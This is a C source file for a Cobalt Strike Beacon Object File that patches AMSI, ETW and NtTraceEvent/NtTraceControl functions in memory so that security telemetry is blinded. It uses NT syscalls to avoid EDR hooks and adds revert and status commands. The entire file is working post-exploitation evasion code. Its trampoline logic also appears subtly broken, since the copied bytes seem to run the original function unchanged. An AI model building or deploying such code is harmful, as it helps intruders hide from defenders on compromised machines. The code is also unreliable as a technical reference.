/**
 * @file bofblind.c
 * @brief Cobalt Strike BOF that blinds telemetry by trampoline-patching AMSI,
 *        ETW, and Sysmon (NtTraceEvent/NtTraceControl) functions in-process.
 * @rationale Trampoline patching preserves the original bytes in an allocated
 *            stub so callers still execute the real function body; only
 *            detection-facing telemetry paths are silenced. Using NT syscall
 *            wrappers (NtProtectVirtualMemory, NtWriteVirtualMemory) avoids
 *            Win32 API hooks that EDR products commonly place on VirtualProtect.
 */

/*
 * @decision DEC-BOFBLIND-001
 * @title HookTarget table + applyRange() replaces duplicate wrapper functions
 * @status accepted
 * @rationale The original code had 3 duplicate patchXxx() wrappers and a separate
 *   inline check block in go(). Adding revert support (PR #1) doubled that to 6
 *   wrappers. This revision centralises all targets in a static HookTarget table
 *   and introduces applyRange() so adding/removing targets requires only one edit.
 *   The switch in go() maps integer command codes to (operation, slice) pairs with
 *   no duplicated module/function-name strings.
 *
 * @decision DEC-BOFBLIND-002
 * @title NtFreeVirtualMemory added for trampoline lifecycle management
 * @status accepted
 * @rationale The original and PR #1 code allocated a 4 KB trampoline page per hook
 *   but never freed it — neither on success nor on any failure path. Over multiple
 *   blind/revert cycles in a long-lived session this leaks virtual address space.
 *   NtFreeVirtualMemory is now called in revertPatch() after the original bytes are
 *   restored and on every trampolinePatch() failure path that allocated memory.
 *
 * @decision DEC-BOFBLIND-003
 * @title FlushInstructionCache added after every write
 * @status accepted
 * @rationale On SMP systems the processor instruction cache is per-core. Writing
 *   new bytes to executable memory without flushing can leave stale cached
 *   instructions on other cores, causing unpredictable crashes. This mirrors the
 *   reference implementation (ddanielx86/bofblind) which always flushes after a
 *   patch or revert.
 */

#include <windows.h>
#include "beacon.h"

#define NT_SUCCESS    0x00000000
#define PATCH_LEN     12
#define MEM_RELEASE   0x8000
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$FlushInstructionCache(HANDLE, LPCVOID, SIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID, PULONG, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtFreeVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG);

typedef struct { const char* mod; const char* fn; } HookTarget;

static HookTarget TARGETS[] = {
    { "amsi.dll",  "AmsiScanBuffer"    },
    { "amsi.dll",  "AmsiOpenSession"   },
    { "ntdll.dll", "EtwEventWrite"     },
    { "ntdll.dll", "EtwEventWriteFull" },
    { "ntdll.dll", "NtTraceEvent"      },
    { "ntdll.dll", "NtTraceControl"    },
};
#define TARGET_COUNT (sizeof(TARGETS) / sizeof(TARGETS[0]))

void trampolinePatch(const char* moduleName, const char* functionName) {
    HMODULE mod = KERNEL32$GetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Module not found: %s\n", moduleName);
        return;
    }

    BYTE* target = (BYTE*)KERNEL32$GetProcAddress(mod, functionName);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Function not found: %s\n", functionName);
        return;
    }

    if (target[0] == 0xE9) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Already patched: %s\n", functionName);
        return;
    }

    PVOID trampoline = NULL;
    SIZE_T regionSize = 0x1000;
    NTSTATUS status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), &trampoline, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != NT_SUCCESS || trampoline == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtAllocateVirtualMemory failed\n");
        return;
    }

    for (int i = 0; i < PATCH_LEN; i++)
        ((BYTE*)trampoline)[i] = target[i];

    BYTE jmpBack[5] = { 0xE9 };
    DWORD relBack = (DWORD)((BYTE*)target + PATCH_LEN - ((BYTE*)trampoline + PATCH_LEN + 5));
    *((DWORD*)&jmpBack[1]) = relBack;
    for (int i = 0; i < 5; i++)
        ((BYTE*)trampoline)[PATCH_LEN + i] = jmpBack[i];

    BYTE patch[5] = { 0xE9 };
    DWORD relPatch = (DWORD)((BYTE*)trampoline - (target + 5));
    *((DWORD*)&patch[1]) = relPatch;

    PVOID base = target;
    ULONG oldProtect = 0, newProtect = 0;
    SIZE_T patchSize = 5;

    status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtProtectVirtualMemory failed\n");
        SIZE_T freeSize = 0;
        NTDLL$NtFreeVirtualMemory(NtCurrentProcess(), &trampoline, &freeSize, MEM_RELEASE);
        return;
    }

    status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), target, patch, sizeof(patch), NULL);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtWriteVirtualMemory failed\n");
        NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);
        SIZE_T freeSize = 0;
        NTDLL$NtFreeVirtualMemory(NtCurrentProcess(), &trampoline, &freeSize, MEM_RELEASE);
        return;
    }

    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);
    KERNEL32$FlushInstructionCache(NtCurrentProcess(), target, patchSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Patched: %s\n", functionName);
}

void revertPatch(const char* moduleName, const char* functionName) {
    HMODULE mod = KERNEL32$GetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Module not found: %s\n", moduleName);
        return;
    }

    BYTE* target = (BYTE*)KERNEL32$GetProcAddress(mod, functionName);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Function not found: %s\n", functionName);
        return;
    }

    if (target[0] != 0xE9) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Not patched: %s\n", functionName);
        return;
    }

    DWORD relJmp = *(DWORD*)(target + 1);
    PVOID trampoline = (PVOID)((BYTE*)target + 5 + (LONG)relJmp);

    PVOID base = target;
    ULONG oldProtect = 0, newProtect = 0;
    SIZE_T patchSize = 5;

    NTSTATUS status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtProtectVirtualMemory failed\n");
        return;
    }

    status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), target, trampoline, 5, NULL);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtWriteVirtualMemory failed\n");
        NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);
        return;
    }

    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);
    KERNEL32$FlushInstructionCache(NtCurrentProcess(), target, patchSize);

    SIZE_T freeSize = 0;
    NTDLL$NtFreeVirtualMemory(NtCurrentProcess(), &trampoline, &freeSize, MEM_RELEASE);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Reverted: %s\n", functionName);
}

void checkStatus(const char* moduleName, const char* functionName) {
    HMODULE mod = KERNEL32$GetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %-30s (module not loaded)\n", functionName);
        return;
    }
    BYTE* fn = (BYTE*)KERNEL32$GetProcAddress(mod, functionName);
    if (!fn) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %-30s not found\n", functionName);
        return;
    }
    if (fn[0] == 0xE9) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %-30s PATCHED\n", functionName);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %-30s CLEAN  (%02X %02X %02X)\n", functionName, fn[0], fn[1], fn[2]);
    }
}

static void applyRange(void (*op)(const char*, const char*), int start, int end) {
    for (int i = start; i < end; i++)
        op(TARGETS[i].mod, TARGETS[i].fn);
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int cmd = BeaconDataInt(&parser);

    KERNEL32$LoadLibraryA("amsi.dll");

    switch (cmd) {
        case 0: applyRange(trampolinePatch, 0, TARGET_COUNT); break;
        case 1: applyRange(trampolinePatch, 0, 2);            break;
        case 2: applyRange(trampolinePatch, 2, 4);            break;
        case 3: applyRange(trampolinePatch, 4, 6);            break;
        case 4: applyRange(checkStatus,     0, TARGET_COUNT); break;
        case 5: applyRange(revertPatch,     0, TARGET_COUNT); break;
        case 6: applyRange(revertPatch,     0, 2);            break;
        case 7: applyRange(revertPatch,     2, 4);            break;
        case 8: applyRange(revertPatch,     4, 6);            break;
    }
}
